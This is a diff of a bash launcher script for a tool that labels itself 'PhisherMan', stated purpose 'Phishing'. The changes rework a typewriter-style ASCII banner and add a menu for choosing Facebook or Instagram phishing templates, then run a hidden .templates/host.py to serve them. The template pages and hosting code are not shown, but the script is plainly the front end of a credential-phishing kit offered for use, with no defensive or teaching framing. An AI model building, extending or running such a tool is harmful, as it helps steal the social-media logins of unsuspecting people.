@@ -9,7 +9,7 @@ PS1="\[\e[1m\]\$ \[\e[0m\]"
 # Function to display text as if it's being typed
 type_text() {
   local text="$1"
-  local delay="0.00005"
+  local delay="0.0000000000000000000000000000005"
   local i=0
 
   while [ $i -lt ${#text} ]; do
@@ -22,16 +22,29 @@ type_text() {
 }
 
 # Display the ASCII art with typewriter effect
+type_text ""
+type_text ""
+type_text ""
+type_text ""
+type_text ""
 type_text "            ------------------------------------  "
-
 type_text "            |           PHISHERMAN             |  "
+type_text "            ------------------------------------  "
+echo "            | Tool          | PhisherMan       |  "
+echo "            | Purpose       | Phishing         |  "
+echo "            | Author        | ABC Dior         |  "
+echo "            | Collaborators | None             |  "
+echo "            | Version       | 1.0              |  "
+type_text "            ------------------------------------  "
 
-type_text "            ------------------------------------  "
-type_text "            | Tool          | PhisherMan       |  "
-type_text "            | Purpose       | Phishing         |  "
-type_text "            | Author        | ABC Dior         |  "
-type_text "            | Collaborators | None             |  "
-type_text "            | Version       | 1.0              |  "
-type_text "            ------------------------------------  "
-# Execute the Python script
-python .templates/host.py
+echo
+type_text "           Type template number to select it. "
+type_text "           For example, type: 01 to select Facebook "
+
+echo "           | Code      |  Name               | "
+echo "           | 01        |  Facebook           | "
+echo "           | 02        |  Instagram          | "
+echo "           | Others    |  Coming soon        | "
+echo
+python ".templates/host.py"
+exit 0
